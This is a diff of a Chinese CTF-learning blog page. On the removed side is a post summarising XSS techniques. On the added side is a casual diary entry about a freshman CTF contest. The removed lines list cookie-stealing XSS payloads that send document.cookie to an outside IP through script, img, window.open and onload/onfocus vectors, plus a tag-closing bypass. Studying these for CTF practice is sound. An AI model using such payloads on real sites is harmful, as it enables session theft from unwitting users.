@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="color-scheme" content="light dark">
   
-  <title>xss思路总结 - 你也喜欢小狸猫吗</title>
+  <title>你也喜欢小狸猫吗</title>
   
     <link rel="shortcut icon" href="/favicon.png">
   
@@ -16,15 +16,15 @@
   
   
   
-  <meta property="og:title" content="xss思路总结 - 你也喜欢小狸猫吗" />
+  <meta property="og:title" content="你也喜欢小狸猫吗" />
   
   <meta property="og:type" content="article" />
   
-  <meta property="og:url" content="https://za0y0u.github.io/2023/10/21/ctf/xss%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/index.html" />
+  <meta property="og:url" content="https://za0y0u.github.io/2023/10/29/ctf/%E6%80%BB%E7%BB%93%EF%BC%9F%E8%BF%87%E5%BA%A6%EF%BC%9F%E6%88%91%E4%B8%8D%E7%9F%A5%E9%81%93/index.html" />
   
   <meta property="og:image" content="/favicon.png" />
   
-  <meta property="og:article:published_time" content="2023-10-21T14:29:59.000Z" />
+  <meta property="og:article:published_time" content="2023-10-29T05:00:35.597Z" />
   
   <meta property="og:article:author" content="za0y0u" />
   
@@ -155,22 +155,26 @@
         
         <div class="date" id="date">
             <span>October</span>
-            <span>21,</span>
+            <span>29,</span>
             <span>2023</span>
         </div>
         
 
-        <h2 class="title">xss思路总结</h2>
+        <h2 class="title"></h2>
     </div>
 
     <div class="divider"></div>
 
     <div class="content">
-        <h4><span id="无过滤">无过滤</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常用payload</span><br><span class="line">&lt;script&gt; var img=document.createElement(&quot;img&quot;); img.src=&quot;http://118.31.168.198:39543/&quot;+document.cookie; &lt;/script&gt;</span><br><span class="line">&lt;script&gt;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;location.href=&#x27;http://118.31.168.198:39543/&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://118.31.168.198:39543/&#x27;+document.cookie&lt;/script&gt; </span><br><span class="line">&lt;input οnfοcus=&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot; autofocus&gt; 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;svg οnlοad=&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">&lt;iframe οnlοad=&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;body οnlοad=&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+        <hr>
+<h2><span id="title总结过度我不知道">‘title:总结？过度？我不知道’</span></h2><h3><span id="刚打完新生赛">刚打完新生赛</span></h3><p>题刷太少了，web没思路，根本没写过xxe，ssti，ssrf的题，拿到题目一脸懵，不知道自己是谁，签到题找半天，想半天，结果直接源码找，不知道为什么网络找不到这个js文件，才写两题</p>
+<p>幸好学了点密码基础知识，写了4题，rsa那题根本不知道要干嘛，看不懂</p>
+<p>！最最最搞心态的是python环境出了问题，搞半天也没搞好，web题一题都不想做了</p>
+<h3><span id="ctf阶段性结束想学学渗透真不想刷题太没意思了">ctf阶段性结束，想学学渗透（真不想刷题，太没意思了）</span></h3><p>虽然pwn还没入门，其他方向接触了一下，感觉差不多了，web基础不牢，但后面还是往渗透方向发展，比赛就看情况吧</p>
+<p>还要考试什么的事真多，在此省略1000字骂学校的话</p>
+<p>差不多了，享受今天下午了</p>
+<h3><span id="以后得多花时间在学习上别天天就想着玩">以后得多花时间在学习上，别天天就想着玩</span></h3><p>啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊，再玩一下午，哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈                      0y0</p>
 
-<h4><span id="闭合绕过">闭合绕过</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&quot;</span><br></pre></td></tr></table></figure>
-
-<h4><span id="大小写绕过">大小写绕过</span></h4><h4><span id="替换为空双写绕过">替换为空，双写绕过</span></h4>
     </div>
 
     
@@ -184,22 +188,13 @@
     
 
     <div class="container post-prev-next">
+        <a class="next"></a>
         
-        <a href="/2023/10/21/ctf/RCE%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" class="next">
-            <div>
-                <div class="text">
-                    <p class="label">Next</p>
-                    <h3 class="title">RCE思路总结</h3>
-                </div>
-            </div>
-        </a>
-        
-        
-        <a href="/2023/10/21/ctf/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" class="prev">
+        <a href="/2023/10/27/ctf/%E5%88%9D%E5%AD%A6ssrf/" class="prev">
             <div>
                 <div class="text">
                     <p class="label">Previous</p>
-                    <h3 class="title">文件上传思路总结</>
+                    <h3 class="title">初学ssrf</>
                 </div>
             </div>
         </a>
